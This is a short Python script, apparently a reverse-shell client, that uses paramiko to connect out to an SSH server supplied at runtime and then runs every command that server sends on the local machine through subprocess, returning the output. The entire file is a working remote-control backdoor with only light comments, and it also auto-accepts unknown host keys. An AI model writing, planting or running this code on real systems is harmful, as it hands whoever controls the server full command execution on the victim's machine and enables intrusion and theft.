import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    """
    Connects to an SSH server and creates an interactive session 
    where the remote server can send commands to execute on this client.

    Args:
        ip (str): Target SSH server IP address.
        port (int): SSH port number.
        user (str): SSH username.
        passwd (str): SSH password.
        command (str): Initial message to send after connection.

    Returns:
        None
    """
    # Create an SSH client
    client = paramiko.SSHClient()

    # Automatically accept unknown SSH keys (not recommended for production)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the SSH server
    client.connect(ip, port=port, username=user, password=passwd)

    # Open an interactive SSH session
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        # Send initial message to the SSH server
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())  # Print server's response

        # Continuously listen for commands from the remote server
        while True:
            command = ssh_session.recv(1024)  # Receive command from the server
            try:
                cmd = command.decode()  # Decode the command

                # If "exit" is received, close the session
                if cmd == 'exit':
                    client.close()
                    break

                # Execute the received command locally on the client machine
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)

                # Send the command output back to the server
                ssh_session.send(cmd_output or 'okay')

            except Exception as e:
                # Send error message back to the server
                ssh_session.send(str(e))

        client.close()
    return

if __name__ == '__main__':
    import getpass  # Secure password input

    # Get current system username
    user = getpass.getuser()

    # Ask for SSH password securely
    password = getpass.getpass()

    # Ask for the SSH server details
    ip = input('Enter server IP: ')
    port = input('Enter port: ')

    # Start the SSH session
    ssh_command(ip, port, user, password, 'ClientConnected')
